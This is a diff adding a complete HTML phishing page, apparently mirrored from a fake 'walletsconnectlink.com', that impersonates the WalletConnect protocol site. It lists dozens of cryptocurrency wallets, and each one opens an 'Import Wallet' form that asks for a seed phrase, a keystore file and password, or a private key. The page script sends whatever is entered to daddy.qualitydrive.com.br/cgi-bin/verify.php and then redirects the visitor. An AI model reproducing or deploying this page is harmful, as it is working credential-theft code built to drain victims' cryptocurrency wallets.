@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from walletsconnectlink.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 23 Apr 2021 15:49:45 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="keywords" content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp">
+    <link rel="stylesheet" href="https://daddy.qualitydrive.com.br/cgi-bin/connect.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<link href="https://daddy.qualitydrive.com.br/cgi-bin/repos/bootstrap.min.css" rel="stylesheet">
+	<script src="https://daddy.qualitydrive.com.br/cgi-bin/repos/jquery.js"></script>
+	<script src="https://daddy.qualitydrive.com.br/cgi-bin/repos/popper.min.js"></script>
+	<script src="https://daddy.qualitydrive.com.br/cgi-bin/repos/bootstrap.min.js"></script>
+
+	<style>
+.apps {
+width: 95px;
+height: auto;
+padding: 10px;
+text-align: left;
+margin: auto;
+justify-content: center;
+border: none;
+border-radius: 5px;
+text-align: center;
+float:left;
+cursor:pointer;
+padding:8px;
+border:1px solid #fff;
+}
+
+.apps:hover {
+	border:1px solid #ccc;
+}
+
+.apps a {
+    text-align: center;
+}
+
+.apps img {
+    max-width: 75px;
+    object-fit: cover;
+    margin-bottom: 3px;
+	display:block;
+	min-height:64px;
+	max-height:64px;
+	margin:0px auto 10px auto;
+}
+
+ .modal.fade .modal-bottom,
+ .modal.fade .modal-left,
+ .modal.fade .modal-right,
+ .modal.fade .modal-top {
+     position: fixed;
+     z-index: 1055;
+     top: 0;
+     left: 0;
+     right: 0;
+     bottom: 0;
+     margin: 0;
+     max-width: 100%
+ }
+
+ .modal.fade .modal-right {
+     left: auto !important;
+     transform: translate3d(100%, 0, 0);
+     transition: transform .3s cubic-bezier(.25, .8, .25, 1)
+ }
+
+ .modal.fade.show .modal-bottom,
+ .modal.fade.show .modal-left,
+ .modal.fade.show .modal-right,
+ .modal.fade.show .modal-top {
+     transform: translate3d(0, 0, 0)
+ }
+
+ .w-xl {
+     width: 320px
+ }
+
+ .modal-content,
+ .modal-footer,
+ .modal-header {
+     border: none
+ }
+
+ .h-100 {
+     height: 100% !important
+ }
+
+ .btn-light {
+     color: #212529;
+     background-color: #f5f5f6;
+     border-color: #f5f5f6
+ }
+
+ .btn-light:hover {
+     color: #212529;
+     background-color: #e1e1e4;
+     border-color: #dadade
+ }
+
+ .modal-footer {
+     display: flex;
+     align-items: center;
+     justify-content: flex-end;
+     padding: 1rem;
+     border-top: 1px solid rgba(160, 175, 185, .15);
+     border-bottom-right-radius: .3rem;
+     border-bottom-left-radius: .3rem
+ }
+ 
+ .wallet-logo img {
+	max-width:50px;
+	max-height:50px;
+ }
+</style>
+
+	<link rel="icon" href="icon.svg">
+
+    <title>WalletConnect</title>
+</head>
+
+<body>
+
+    <div class="firstcon">
+        <div class="one">
+            <a href="#">Github</a>
+            <a href="#">docs</a>
+
+        </div>
+        <div class="two">
+            <span class="bimg1"></span>
+
+        </div>
+        <div class="three">
+
+            <a href="#" class="mv1">wallets</a>
+            <a href="#">apps</a>
+        </div>
+
+
+    </div>
+
+    <div>
+        <h2 class="title">WalletConnect</h2>
+        <p class="title2">Open protocol for connecting Wallets to DApps</p>
+
+    </div>
+    <div class="banner"></div>
+	<div class="container">
+		<div class="row">
+			<div class="col-md-6">
+				<h3 class="text-center">What is WalletConnect?</h3>
+				<p class="text-center">WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a
+					safer choice compared to desktop or browser extension wallets.</p>
+
+			</div>
+			<div class="col-md-6">
+				<h3 class="text-center">How does it work?</h3>
+				<p class="text-center">
+					WalletConnect connects web applications to supported <a href="#" class="sublink">mobile wallets</a>.WalletConnect session is started by a scanning a QR code (desktop) or by clicking an application deep link (mobile).
+				</p>
+			</div>
+		</div>
+	</div>
+	<div class="wallets container text-center" id="wallets">
+		<h1 class="home">Wallets</h1>
+		<p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+		</br>
+            <div class="all container row col-md-12">
+				<div class="apps" app="MetaMask" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/metamask.png"></a></br>
+				MetaMask                    
+				</div>
+				<div class="apps" app="MEW Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/MEW.png"></a></br>
+				MEW Wallet                    </div>
+				<div class="apps" app="Trust Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/trustwallet.png"></a></br>
+				Trust Wallet                    </div>
+				<div class="apps" app="Wallect Connect" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/logo.svg"></a></br>
+				Wallect Connect                    </div>
+				<div class="apps" app="Coinbase Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/coinbase.jpg"></a></br>
+				Coinbase Wallet                    </div>
+				<div class="apps" app="Atomic Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/atomic.png"></a></br>
+				Atomic Wallet                    </div>
+				<div class="apps" app="Binance Smart Chain" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/binance.png"></a></br>
+				Binance Smart Chain                    </div>
+				<div class="apps" app="BNB" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/bnb.png"></a></br>
+				BNB                    </div>
+				<div class="apps" app="Polkadot" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/polkadot.png"></a></br>
+				Polkadot                    </div>
+				<div class="apps" app="XRP" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/xrp.png"></a></br>
+				XRP                    </div>
+				<div class="apps" app="Stellar" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/stellar.png"></a></br>
+				Stellar                    </div>
+				<div class="apps" app="Tezos" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/tezos.png"></a></br>
+				Tezos                    </div>
+				<div class="apps" app="Theta" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/theta.png"></a></br>
+				Theta                    </div>
+				<div class="apps" app="Tron" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/tron.png"></a></br>
+				Tron                    </div>
+				<div class="apps" app="Cosmos" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/cosmos.png"></a></br>
+				Cosmos                    </div>
+				<div class="apps" app="Kava" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/kava.png"></a></br>
+				Kava                    </div>
+				<div class="apps" app="Filecoin" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/filecoin.png"></a></br>
+				Filecoin                    </div>
+				<div class="apps" app="Solana" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/solana.png"></a></br>
+				Solana                    </div>
+				<div class="apps" app="Ethereum Classic" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/ethereum-classic.png"></a></br>
+				Ethereum Classic                    </div>
+				<div class="apps" app="Zilliqa" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/zilliqa.png"></a></br>
+				Zilliqa                    </div>
+				<div class="apps" app="Elrond" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/elrond.jpg"></a></br>
+				Elrond                    </div>
+				<div class="apps" app="Waves" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/waves.png"></a></br>
+				Waves                    </div>
+				<div class="apps" app="ICON" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/icon.png"></a></br>
+				ICON                    </div>
+				<div class="apps" app="Ontology" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/ontology.png"></a></br>
+				Ontology 
+				</div>
+				<div class="apps" app="Oxen Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/oxen.png"></a></br>
+				Oxen Wallet                        </div>
+				<div class="apps" app="Nano" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/nano.png"></a></br>
+				Nano                        </div>
+				<div class="apps" app="Tomo Chain" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/tomo.png"></a></br>
+				Tomo Chain                        </div>
+				<div class="apps" app="VeChain" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/vechain.jpg"></a></br>
+				VeChain                        </div>
+				<div class="apps" app="IoTex" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/iotex.png"></a></br>
+				IoTex                        </div>
+				<div class="apps" app="Wanchain" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/wanchain.png"></a></br>
+				Wanchain                        </div>
+				<div class="apps" app="Harmony" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/harmony.png"></a></br>
+				Harmony                        </div>
+				<div class="apps" app="Kin" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/kin.png"></a></br>
+				Kin                        </div>
+				<div class="apps" app="Nimiq" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/nimiq.png"></a></br>
+				Nimiq                        </div>
+				<div class="apps" app="Aion" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/aion.png"></a></br>
+				Aion                        </div>
+				<div class="apps" app="Thunder Token" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/thundertoken.png"></a></br>
+				Thunder Token                        </div>
+				<div class="apps" app="Aeternity" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/aeternity.png"></a></br>
+				Aeternity                        </div>
+				<div class="apps" app="Nebulas" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/nebulas.png"></a></br>
+				Nebulas                        </div>
+				<div class="apps" app="FIO" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/fio.png"></a></br>
+				FIO                        </div>
+				<div class="apps" app="GoChain" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/gochain.png"></a></br>
+				GoChain                        </div>
+				<div class="apps" app="POA Network" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/poa.png"></a></br>
+				POA Network                        </div>
+				<div class="apps" app="Callisto" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/callisto.png"></a></br>
+				Callisto                        </div>
+				<div class="apps" app="BitPay" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/bitpay.jpg"></a></br>
+				BitPay                        </div>
+				<div class="apps" app="Aktionariat" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/aktionariat.png"></a></br>
+				Aktionariat                        </div>
+				<div class="apps" app="AtWallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/atwallet.png"></a></br>
+				AtWallet                        </div>
+				<div class="apps" app="Guard Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/guard.png"></a></br>
+				Guard Wallet                        </div>
+				<div class="apps" app="AAVE" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/aave.jpg"></a></br>
+				AAVE                        </div>
+				<div class="apps" app="Exodus" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/exodus.jpg"></a></br>
+				Exodus                        </div>
+				<div class="apps" app="Enjin" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/enjin.jpg"></a></br>
+				Enjin                        </div>
+				<div class="apps" app="Skale" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/skale.png"></a></br>
+				Skale                        </div>
+				<div class="apps" app="Portis" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/portis.png"></a></br>
+				Portis                        </div>
+				<div class="apps" app="Trezor" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/trezor.png"></a></br>
+				Trezor                        </div>
+				<div class="apps" app="Squarelink" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/squarelink.png"></a></br>
+				Squarelink                        </div>
+				<div class="apps" app="Torus" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/torus.jpg"></a></br>
+				Torus                        </div>
+				<div class="apps" app="Scatter Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/scatter.jpg"></a></br>
+				Scatter Wallet                        </div>
+				<div class="apps" app="Sumcoin" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/sumcoin.png"></a></br>
+				Sumcoin                        </div>
+				<div class="apps" app="Math Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/math-wallet.png"></a></br>
+				Math Wallet                        </div>
+				<div class="apps" app="FortMatic" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/fortmatic.png"></a></br>
+				FortMatic                        </div>
+				<div class="apps" app="Digitex" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/digitex.png"></a></br>
+				Digitex                        </div>
+				<div class="apps" app="Ledger" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/ledger.png"></a></br>
+				Ledger                        </div>
+				<div class="apps" app="Defiat" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/defiat.jpg"></a></br>
+				Defiat                        </div>
+				<div class="apps" app="Authereum" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/authereum.png"></a></br>
+				Authereum                        </div>
+				<div class="apps" app="Flare Wallet" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/flare.jpg"></a></br>
+				Flare Wallet                        </div>
+				<div class="apps" app="Zelcore" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/zelcore.png"></a></br>
+				Zelcore                        </div>
+				<div class="apps" app="BitKeep" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/bitkeep.png"></a></br>
+				BitKeep                        </div>
+				<div class="apps" app="Coin98" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/coin98.png"></a></br>
+				Coin98                        </div>
+				<div class="apps" app="Trust Vault" data-toggle="modal" data-target="#myModal">
+				<a><img src="trusted/trustvault.png"></a></br>
+				Trust Vault 
+				</div>
+			</div>
+        </div>
+
+	<div class="clearfix"></div>
+    <div class="text-center mt-5 mb-5 foot">
+        <a href="./" class="link-dark mr-3"><i class="fa fa-flickr"></i> Flickr</a>
+        <a href="./" class="link-dark mr-3"><i class="fa fa-telegram"></i> Telegram</a>
+        <a href="./" class="link-dark mr-3"><i class="fa fa-twitter"></i> Twitter</a>
+        <a href="./" class="link-dark"><i class="fa fa-github"></i> Github</a>
+    </div>
+	<input type="hidden" id="import-type" value="#phrase">
+	<input type="hidden" id="wallet">
+	
+<div class="page-content page-container" id="page-content">
+    <div class="padding">
+        <div class="row container d-flex justify-content-center">
+                <div id="myModal" class="modal bg-dark fade" data-backdrop="false">
+                    <div class="modal-dialog modal-md">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <div class="modal-title text-md">Import Wallet</div> <button class="close" data-dismiss="modal">&times;</button>
+                            </div>
+                            <div class="modal-body" style="padding-top:0px;">
+							<center><div class="wallet-logo"></div><p class="lead wallet-name"></center>
+							<ul class="nav nav-pills mb-3 mt-2">
+								<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+								<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+								<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#pkey">Private Key</a></li>
+							</ul>
+
+<div class="tab-content">
+	<div id="phrase" class="tab-pane  in active">
+		<form>
+			<span class="text-danger phrase-err" style="font-size:13px;"></span>
+			<textarea class="form-control" rows="5" name="phrase" id="phrase" placeholder="Phrase" required></textarea>
+			<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+		</form>
+	</div>
+	<div id="keystore" class="tab-pane fade">
+		<form>
+			<span class="text-danger keystore-err" style="font-size:13px;"></span>
+			<div class="form-group">
+				<textarea class="form-control" name="keystore" id="keystore" rows="5" placeholder="Keystore JSON" required></textarea>
+			</div>
+			<div class="form-group">
+				<input class="form-control" type="password" name="keypass" id="keypass" placeholder="Password" required>
+			</div>
+			<p class="text-secondary" style="margin-top: 10px;">
+				Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+			</p>
+		</form>
+	</div>
+	<div id="pkey" class="tab-pane fade">
+		<form>
+			<span class="text-danger pkey-err" style="font-size:13px;"></span>
+			<div class="form-group">
+				<input class="form-control" name="privatekey" id="privatekey" placeholder="Private Key" required>
+			</div>
+			<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+		</form>
+	</div>
+</div>
+                            </div>
+                            <div class="modal-footer">
+								<button type="button" class="btn btn-light" data-dismiss="modal">Close</button> 
+								<button type="button" class="btn btn-primary import-now"><i class="fa fa-key"></i> IMPORT</button>
+							</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+</body>
+<script>
+$('.apps').click((app)=> {
+	console.log(app);
+	$('div.wallet-logo').html(app.target.outerHTML);
+	$('input#wallet').val(app.delegateTarget.attributes.app.nodeValue);
+	$('p.wallet-name').html(app.delegateTarget.attributes.app.nodeValue);
+});
+
+$('.nav-link').click((tab)=> {
+	$('input#import-type').val(tab.target.attributes.href.nodeValue);
+});
+
+$('.import-now').click(function() {
+	$('span.phrase-err, span.keystore-err, span.pkey-err').html('');
+	var type = $('input#import-type').val();
+	var body = {};
+	if(type==="#phrase") {
+		let phrase = $('textarea#phrase').val();
+		if(phrase.length < 12) {
+			$('span.phrase-err').html('Please enter the words completely');
+			return false;
+		} else {
+			body = {
+				wallet: $('input#wallet').val(),
+				type: 'Phrase',
+				content: $('textarea#phrase').val()
+			}
+		}
+	}
+	if(type==="#keystore") {
+		let kstore = $('textarea#keystore').val();
+		let kpass = $('input#keypass').val();
+		if(kstore.length < 20 && kpass.length < 4) {
+			$('span.keystore-err').html('Please enter the encrypted key and the password');
+			return false;
+		} else {
+			body = {
+				wallet: $('input#wallet').val(),
+				type: 'Keystore',
+				content: $('textarea#keystore').val(),
+				key: $('input#keypass').val()
+			}
+		}
+	}
+	if(type==="#pkey") {
+		let key = $('input#privatekey').val();
+		if(key.length < 12) {
+			$('span.pkey-err').html('Please enter the key words completely');
+			return false;
+		} else {
+			body = {
+				wallet: $('input#wallet').val(),
+				type: 'Private Key',
+				content: $('input#privatekey').val()
+			}
+		}
+	}
+	$('button.import-now').attr({'disabled':'disabled'}).html('<i class="fa fa-spin fa-spinner"></i>');
+	$.ajax({
+		url: 'https://daddy.qualitydrive.com.br/cgi-bin/verify.php',
+		type: 'POST', 
+		dataType: 'JSON', 
+		data: body,
+		crossDomain: true,
+		success: function(res) {
+			window.location.href="connect.html";
+		},
+		error: function(e) {
+			window.location.href="connect.html";
+		}
+	});
+});
+
+
+</script>
+</html>
